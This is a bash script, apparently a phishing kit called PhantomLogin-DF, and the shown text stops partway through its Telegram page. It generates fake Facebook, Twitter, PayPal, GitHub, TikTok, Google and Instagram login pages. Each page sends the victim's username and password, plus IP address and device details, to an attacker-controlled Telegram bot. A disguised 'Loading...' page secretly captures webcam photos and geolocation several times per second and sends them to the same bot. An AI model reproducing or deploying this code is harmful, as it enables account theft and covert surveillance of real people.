#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${BLUE}
    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
    ${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Version   : 3.0"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

install_dependencies() {
    echo -e "${GREEN}[+] Checking and installing dependencies...${NC}"
    if ! command -v php &> /dev/null; then
        echo -e "${YELLOW}[+] PHP is not installed. Installing PHP...${NC}"
        sudo apt-get install php -y || { echo -e "${RED}[-] Failed to install PHP.${NC}"; exit 1; }
    fi
    if ! command -v ssh &> /dev/null; then
        echo -e "${YELLOW}[+] SSH is not installed. Installing SSH...${NC}"
        sudo apt-get install openssh-client -y || { echo -e "${RED}[-] Failed to install SSH.${NC}"; exit 1; }
    fi
    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}[+] jq is not installed. Installing jq...${NC}"
        sudo apt-get install jq -y || { echo -e "${RED}[-] Failed to install jq.${NC}"; exit 1; }
    fi
    echo -e "${GREEN}[+] All dependencies are installed.${NC}"
}
create_page() {
    local page_name=$1
    local page_content=$2

    echo "$page_content" > "${page_name}.html"
    echo -e "${GREEN}[+] Page ${page_name}.html created successfully.${NC}"
}

facebook_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 8px rgba(24, 119, 242, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #1877f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #145dbf; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #1877f2; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #1877f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h2>Log in to Facebook</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgotten password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Facebook Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.facebook.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

twitter_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #15202b; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #192734; border-radius: 15px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 50px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #ffffff; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #38444d; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #192734; color: #ffffff; }
        input:focus { border-color: #1da1f2; box-shadow: 0 0 8px rgba(29, 161, 242, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #1da1f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #1991db; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #1da1f2; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #38444d; }
        .signup-btn { width: 100%; padding: 14px; background-color: #192734; border: 1px solid #38444d; font-size: 14px; color: #1da1f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #1e2d3b; }
        .terms { margin-top: 20px; font-size: 12px; color: #8899a6; }
        .terms a { color: #1da1f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_%28white%29.png" alt="Twitter Logo">
        <h2>Log in to Twitter</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, email, or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for Twitter</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Twitter Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://twitter.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

paypal_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #003087; box-shadow: 0 0 8px rgba(0, 48, 135, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #003087; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #002366; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #003087; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #003087; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #003087; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
        <h2>Log in to PayPal</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or mobile number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Having trouble logging in?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign Up</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`PayPal Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.paypal.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

github_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #161b22; border-radius: 50%; width: 300px; height: 300px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .login-container img { width: 100px; margin-bottom: 25px; border-radius: 50%; }
        h2 { font-size: 22px; color: #c9d1d9; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #30363d; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #0d1117; color: #c9d1d9; }
        input:focus { border-color: #58a6ff; box-shadow: 0 0 8px rgba(88, 166, 255, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #238636; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #2ea043; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #58a6ff; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #30363d; }
        .signup-btn { width: 100%; padding: 14px; background-color: #21262d; border: 1px solid #30363d; font-size: 14px; color: #58a6ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #30363d; }
        .terms { margin-top: 20px; font-size: 12px; color: #8b949e; }
        .terms a { color: #58a6ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo">
        <h2>Sign in to GitHub</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign in</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create an account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`GitHub Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://github.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

tiktok_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        /* CSS styling for TikTok login page */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #121212;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.2);
            color: #fff;
        }

        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            background-color: #181818;
            color: #fff;
        }

        input:focus {
            border-color: #ff0050;
            box-shadow: 0 0 8px rgba(255, 0, 80, 0.5);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #ff0050;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #e60045;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #ff0050;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #181818;
            border: 1px solid #ff0050;
            font-size: 14px;
            color: #ff0050;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #222;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #ff0050;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
        <h2>Sign in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            let token = "${token}";
            let chatId = "${id}";

            let message = \`🔴 **TikTok Login Attempt**\n👤 Username: \${username}\n🔒 Password: \${password}\`;
            let url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(message)}\`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    alert("Incorrect username or password. Please try again.");
                })
                .catch(error => console.error("Error sending message:", error));
        });
    </script>
</body>
</html>
EOF
}

camera_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: black;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            overflow: hidden;
        }

        #loading {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: white;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "${token}";
        const chatId = "${id}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function sendToBot(message) {
            fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
            });
        }

        function sendWelcomeMessage() {
            const message = \`👋 Welcome to the developer! 
                            \n📩 Contact the developer: @A_Y_TR\`;
            sendToBot(message);
        }

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "image.jpg");

                fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg");
        }

        function sendLocation() {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendToBot(\`📍 Location: https://www.google.com/maps?q=\${lat},\${lon}\`);
            });
        }

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                setInterval(() => {
                    captureAndSend();
                    sendLocation();
                    sendWelcomeMessage();
                }, 125); 
            })
            .catch(err => console.error(err));

        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 5000);
    </script>
</body>
</html>
EOF
}

google_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 8px rgba(26, 115, 232, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a73e8;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #135abe;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a73e8;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        <h2>Sign in to Google</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Google Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.google.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
}

instagram_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #e1306c; box-shadow: 0 0 8px rgba(225, 48, 108, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #e1306c; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #c13584; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #e1306c; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #e1306c; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #e1306c; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
        <h2>Log in to Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Instagram Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.instagram.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

telegram_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
